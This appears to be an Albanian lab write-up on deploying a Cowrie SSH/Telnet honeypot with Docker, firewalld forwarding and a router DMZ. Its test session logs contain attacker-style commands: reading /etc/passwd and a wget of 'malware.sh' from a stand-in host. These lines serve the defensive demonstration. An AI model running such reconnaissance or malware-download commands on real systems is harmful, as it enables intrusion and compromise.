# 🍯 Cowrie SSH Honeypot 
**Mjeti kryesor:** Cowrie v2.9.17 (Docker)  
**Sistemi operativ:** Fedora Linux  
**Router:** Huawei HG8247H5  

---

## 1. Qëllimi 
Qëllimi është konfigurimi dhe testimi i një **SSH Honeypot** duke përdorur mjetin Cowrie të vendosur në Docker. Honeypot-i simulon një server Linux të rremë që kap dhe regjistron tentativa hyrjeje dhe komanda të sulmuesve, pa ekspozuar sistemin real ndaj rreziqeve.

---

## 2. Arkitektura e Rrjetit

```
Internet
    │
    ▼
Router Huawei HG8247H5
(DMZ → 192.168.100.93)
    │
    ▼
Laptop Fedora (192.168.100.93)
    │
    ├── Porta 22  ──firewalld──▶  Porta 2222  ──▶  Docker: Cowrie (SSH Honeypot)
    ├── Porta 23  ──firewalld──▶  Porta 2223  ──▶  Docker: Cowrie (Telnet Honeypot)
    └── Porta 22022 ──────────────────────────▶  SSH Real (administrim)
```

**IP-të e përdorura:**

| Komponenti | IP / Porta |
|---|---|
| Laptop (host) | `192.168.100.93` |
| SSH Real (administrim) | `porta 22022` |
| Cowrie SSH | `porta 2222` |
| Cowrie Telnet | `porta 2223` |
| Docker network (bridge) | `172.19.0.0/16` |
| Router gateway | `192.168.100.1` |

---

## 3. Konfigurimi Hap pas Hapi

### 3.1 Instalimi i Docker dhe Cowrie

```bash
# Krijo direktorinë e projektit
mkdir ~/cowrie-honeypot && cd ~/cowrie-honeypot

# Krijo docker-compose.yml
cat > docker-compose.yml << EOF
version: '3'
services:
  cowrie:
    image: cowrie/cowrie
    container_name: cowrie
    restart: unless-stopped
    ports:
      - "2222:2222"
      - "2223:2223"
    volumes:
      - ./cowrie-data:/cowrie/var
EOF

# Niso Cowrie
docker compose up -d
docker ps  # verifiko që po ekzekutohet
```

### 3.2 Konfigurimi i Firewall (firewalld)

```bash
# Aktivizo masquerade për NAT
sudo firewall-cmd --zone=public --add-masquerade --permanent

# Ridrejto portën 22 → 2222 (Cowrie SSH)
sudo firewall-cmd --permanent --zone=public \
  --add-forward-port=port=22:proto=tcp:toport=2222

# Ridrejto portën 23 → 2223 (Cowrie Telnet)
sudo firewall-cmd --permanent --zone=public \
  --add-forward-port=port=23:proto=tcp:toport=2223

# Hap portën për SSH real
sudo firewall-cmd --permanent --zone=public --add-port=22022/tcp

# Apliko ndryshimet
sudo firewall-cmd --reload

# Verifiko
sudo firewall-cmd --zone=public --list-all
```

**Output i pritshëm:**
```
public
  masquerade: yes
  forward-ports:
    port=22:proto=tcp:toport=2222:toaddr=
    port=23:proto=tcp:toport=2223:toaddr=
  ports: 22022/tcp
```

### 3.3 Konfigurimi i Router (Huawei HG8247H5)

Navigoi te `http://192.168.100.1` → **Forward Rules → DMZ Configuration**

**Hapat:**
1. Kliko **"New"**
2. Aktivizo **"Enable DMZ"** 
3. **WAN Name:** `1_INTERNET_R_VID_50`
4. **Host Address:** `192.168.100.93` (zgjedh `b2:5e:f4:fe:da:01` nga dropdown)
5. Kliko **"Apply"**

> ⚠️ **Arsyeja e DMZ:** Router Huawei HG8247H5 nuk mbështet port forwarding specifik për porta si 22→2222 drejtpërdrejt — DMZ ridrejton të gjithë trafikun e jashtëm te IP-ja e laptopit, ndërsa `firewalld` menaxhon ridrejtimin e saktë të portave.

### 3.4 Aktivizimi i route_localnet (për testim lokal)

```bash
# Lejo ridrejtimin e paketave lokale nëpër firewall
sudo sysctl -w net.ipv4.conf.all.route_localnet=1

# Bëje të përhershme
echo "net.ipv4.conf.all.route_localnet=1" | \
  sudo tee -a /etc/sysctl.d/99-localnet.conf
```

### 3.5 Shtimi i User-it në Wheel Group (sudo)

```bash
# Nga user boboci (admin):
su - boboci
sudo usermod -aG wheel anxhela

# Verifiko
groups anxhela
# Output: anxhela wheel docker

# Hyr sërish me anxhela për të aplikuar grupet
exit
su - anxhela
sudo whoami  # duhet: root
```

> **Shënim:** Linja `%wheel ALL=(ALL) ALL` duhet të jetë e pa-komentuar në `/etc/sudoers`. Hape me `sudo visudo` nëse nevojitet.

---

## 4. Testimi i Honeypot-it

### 4.1 Lidhja direkte me Cowrie

```bash
# Lidhje direkte te Cowrie (porta 2222)
ssh -p 2222 root@192.168.100.93
# Fjalëkalim: çfarëdo (Cowrie pranon gjithçka)
# Output: root@svr04:~#
```

### 4.2 Testimi i Port Forwarding

```bash
# Aktivizo route_localnet fillimisht
sudo sysctl -w net.ipv4.conf.all.route_localnet=1

# Testo port forwarding nga IP lokale
ssh root@192.168.100.93  # duhet → Cowrie

# Testo SSH real
ssh -p 22022 anxhela@localhost  # duhet → sistemi real
```

### 4.3 Monitorimi i Sulmeve Live

```bash
# Shiko të gjitha ngjarjet live
docker logs -f cowrie

# Filtro vetëm tentativat e hyrjes
docker logs -f cowrie | grep "login attempt"

# Shiko komandat e ekzekutuara
docker exec cowrie grep "CMD:" /cowrie/var/log/cowrie/cowrie.log
```

---

## 5. Rezultatet — Sesionet e Kapura

### 5.1 Sesionet e Regjistruara (Test)

| Sesioni | Koha (UTC) | IP Burimi | Kredencialet | Komandat |
|---|---|---|---|---|
| 1 | `14:06:50` | `172.19.0.1` | `root/hello` | `whoami`, `cat /etc/passwd`, `ls /home`, `wget malware.sh` |
| 2 | `14:20:27` | `172.19.0.1` | `root/peace1945` | `ip addr show` |
| 3 | `14:23:06` | `192.168.100.93` | `root/peace1945` | `http://192.168.100.1` |

### 5.2 Analiza e Sesionit 1 (më i detajuar)

Sulmuesi (test) ekzekutoi sekuencën klasike të rekognoscimit:

```bash
whoami          # identifikon user-in aktual
cat /etc/passwd # lexon listën e user-ave
ls /home        # kërkon direktori home-sh
wget http://example.com/malware.sh  # tentim shkarkimi malware
```

Cowrie **simuloi me sukses** shkarkimin e `malware.sh` dhe e ruajti me hash SHA-256:
```
fb91d75a6bb430787a61b0aec5e374f580030f2878e1613eab5ca6310f7bbb9a
```

Skedari ruhet te: `~/cowrie-honeypot/cowrie-data/downloads/`

### 5.3 Output i Cowrie Log (fragment)

```
2026-04-23T14:06:50 login attempt [b'root'/b'hello'] succeeded
2026-04-23T14:07:43 CMD: whoami
2026-04-23T14:07:43 Command found: whoami
2026-04-23T14:07:43 CMD: cat /etc/passwd
2026-04-23T14:07:43 CMD: ls /home
2026-04-23T14:08:06 CMD: wget http://example.com/malware.sh
2026-04-23T14:08:07 Downloaded URL with SHA-256 fb91d75...
```

---

## 6. Si Funksionojnë Sulmet Reale

Pas aktivizimit të DMZ, IP-ja publike e honeypot-it bëhet e aksesueshme nga interneti. Sulmet reale ndjekin këto faza:

| Faza | Përshkrimi | Koha tipike |
|---|---|---|
| **Zbulimi** | Bots skanojnë IP-të publike me Masscan/ZMap | 30 min - 6 orë |
| **Brute Force** | Provë automatike e fjalëkalimeve (`root/123456`, `admin/admin`) | Vazhdimisht |
| **Rekognoscim** | `whoami`, `uname -a`, `cat /etc/passwd` | Menjëherë pas hyrjes |
| **Post-Exploitation** | Shkarkimi i crypto miner-ave, backdoor-eve | Brenda 2 minutave |

Cowrie lejon hyrjen me çdo fjalëkalim dhe simulon të gjitha komandat — sulmuesi mendon se ka hyrë në sistem real, por çdo veprim regjistrohet pa rrezik.

---

## 7. Struktura e Skedarëve

```
~/cowrie-honeypot/
├── docker-compose.yml          # Konfigurimi i Docker
└── cowrie-data/
    ├── log/
    │   ├── cowrie.log          # Log kryesor (tekst)
    │   └── cowrie.json         # Log në format JSON
    ├── downloads/              # Malware i shkarkuar nga sulmuesit
    └── tty/                    # Regjistrime TTY të sesioneve
```

---

## 8. Komanda të Dobishme

```bash
# Niso/ndalo/rinis Cowrie
docker start cowrie
docker stop cowrie
docker restart cowrie

# Shiko statusin
docker ps
docker stats cowrie

# Shiko logjet
docker logs -f cowrie
docker exec cowrie tail -f /cowrie/var/log/cowrie/cowrie.log

# Numëro tentativat e hyrjes
docker exec cowrie grep -c "login attempt" /cowrie/var/log/cowrie/cowrie.log

# Shiko IP-t e sulmuesve
docker exec cowrie grep "login attempt" /cowrie/var/log/cowrie/cowrie.log \
  | grep -oP "\d+\.\d+\.\d+\.\d+" | sort | uniq -c | sort -rn

# Shiko malware-in e shkarkuar
ls -la ~/cowrie-honeypot/cowrie-data/downloads/
```

---

## 9. Çmontimi i Honeypot-it

Për të hequr gjithçka:

```bash
# 1. Ndalo dhe fshi Docker container
docker stop cowrie
docker rm cowrie
docker rmi cowrie/cowrie

# 2. Fshi dosjen e projektit
rm -rf ~/cowrie-honeypot

# 3. Hiq rregullat e firewall
sudo firewall-cmd --permanent --zone=public \
  --remove-forward-port=port=22:proto=tcp:toport=2222
sudo firewall-cmd --permanent --zone=public \
  --remove-forward-port=port=23:proto=tcp:toport=2223
sudo firewall-cmd --permanent --zone=public --remove-masquerade
sudo firewall-cmd --permanent --zone=public --remove-port=22022/tcp
sudo firewall-cmd --reload

# 4. Çaktivizo DMZ në router
# http://192.168.100.1 → Forward Rules → DMZ Configuration → Delete
```

---

## 10. Konkluzione

- Cowrie u instalua dhe konfigurua me sukses në Docker
- Port forwarding u aktivizua: `22 → 2222` (SSH) dhe `23 → 2223` (Telnet)
- DMZ u konfigurua në router Huawei HG8247H5
- Honeypot-i kapi dhe regjistroi sesione test me sukses
- Cowrie simuloi shkarkimin e malware-it dhe ruajti hash-in SHA-256
- SSH real mbetet i aksesueshëm vetëm nëpërmjet portës `22022`

Honeypot-i është një mjet i fuqishëm për studimin e sulmeve reale SSH/Telnet, mbledhjen e inteligjencës rreth sulmuesve dhe analizën e malware-it — pa rrezikuar sistemin real.

